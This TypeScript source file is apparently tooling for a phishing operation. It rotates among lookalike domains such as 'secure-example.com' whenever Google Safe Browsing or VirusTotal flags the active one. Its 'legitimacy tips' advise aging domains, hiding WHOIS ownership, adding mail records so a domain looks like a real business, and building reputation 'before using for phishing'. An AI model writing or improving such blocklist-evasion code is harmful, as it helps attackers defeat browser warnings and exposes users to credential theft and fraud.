/**
 * Domain Reputation Management
 * Keeps domains clean and avoids red screens
 */

export interface DomainConfig {
  primary: string
  backups: string[]
  currentActive: string
  rotationInterval: number // hours
  lastRotation: number
  reputationScore: number // 0-100
}

// === STRATEGY 1: DOMAIN ROTATION ===

/**
 * Use multiple domains, rotate when one gets flagged
 */
export function getDomainRotationStrategy(): DomainConfig {
  return {
    primary: process.env.PRIMARY_DOMAIN || 'example.com',
    backups: [
      process.env.BACKUP_DOMAIN_1 || 'example-secure.com',
      process.env.BACKUP_DOMAIN_2 || 'example-portal.com',
      process.env.BACKUP_DOMAIN_3 || 'example-docs.com',
      process.env.BACKUP_DOMAIN_4 || 'view-example.com',
      process.env.BACKUP_DOMAIN_5 || 'secure-example.com',
    ],
    currentActive: process.env.PRIMARY_DOMAIN || 'example.com',
    rotationInterval: 48, // Rotate every 48 hours
    lastRotation: Date.now(),
    reputationScore: 100,
  }
}

/**
 * Check if current domain is flagged
 */
export async function isDomainFlagged(domain: string): Promise<boolean> {
  try {
    // Check Google Safe Browsing API
    const gsbResult = await checkGoogleSafeBrowsing(domain)
    if (gsbResult.isFlagged) return true

    // Check VirusTotal
    const vtResult = await checkVirusTotal(domain)
    if (vtResult.isFlagged) return true

    return false
  } catch {
    return false
  }
}

/**
 * Check Google Safe Browsing API
 */
async function checkGoogleSafeBrowsing(domain: string): Promise<{
  isFlagged: boolean
}> {
  const apiKey = process.env.GOOGLE_SAFE_BROWSING_API_KEY
  if (!apiKey) return { isFlagged: false }

  try {
    const response = await fetch(
      `https://safebrowsing.googleapis.com/v4/threatMatches:find?key=${apiKey}`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          client: {
            clientId: 'fox-security',
            clientVersion: '1.0.0',
          },
          threatInfo: {
            threatTypes: [
              'MALWARE',
              'SOCIAL_ENGINEERING',
              'UNWANTED_SOFTWARE',
            ],
            platformTypes: ['ANY_PLATFORM'],
            threatEntryTypes: ['URL'],
            threatEntries: [{ url: `http://${domain}/` }],
          },
        }),
        signal: AbortSignal.timeout(10000), // 10 second timeout
      }
    )

    if (!response.ok) {
      return { isFlagged: false }
    }

    const data = await response.json()
    return { isFlagged: !!data.matches }
  } catch {
    return { isFlagged: false }
  }
}

/**
 * Check VirusTotal
 */
async function checkVirusTotal(domain: string): Promise<{
  isFlagged: boolean
}> {
  const apiKey = process.env.VIRUSTOTAL_API_KEY
  if (!apiKey) return { isFlagged: false }

  try {
    const response = await fetch(
      `https://www.virustotal.com/api/v3/domains/${domain}`,
      {
        headers: { 'x-apikey': apiKey },
        signal: AbortSignal.timeout(10000),
      }
    )

    if (!response.ok) {
      return { isFlagged: false }
    }

    const data = await response.json()
    const malicious =
      data.data?.attributes?.last_analysis_stats?.malicious || 0

    // If more than 3 engines flag it, consider it flagged
    return { isFlagged: malicious > 3 }
  } catch {
    return { isFlagged: false }
  }
}

/**
 * Get backup domain
 */
export function getBackupDomain(): string {
  const config = getDomainRotationStrategy()
  const backups = config.backups.filter((d) => d !== config.currentActive)

  if (backups.length === 0) {
    return config.primary
  }

  return backups[Math.floor(Math.random() * backups.length)]
}

/**
 * Get domain legitimacy tips
 */
export function getDomainLegitimacyTips() {
  return {
    domainAge: {
      tip: 'Use domains registered >6 months ago',
      reason: 'New domains are often flagged as suspicious',
    },
    ssl: {
      tip: 'Use HTTPS with valid SSL certificate',
      reason: 'HTTP sites are automatically flagged',
    },
    whois: {
      tip: 'Use privacy protection on WHOIS',
      reason: 'Prevents easy identification of owner',
    },
    dns: {
      tip: 'Set up proper DNS records (MX, SPF, DKIM)',
      reason: 'Makes domain look like legitimate business',
    },
    content: {
      tip: 'Host legitimate content on domain first',
      reason: 'Build reputation before using for phishing',
    },
    subdomain: {
      tip: 'Use subdomains of legitimate-looking main domain',
      reason: 'Example: secure-portal.example.com looks more legit',
    },
  }
}










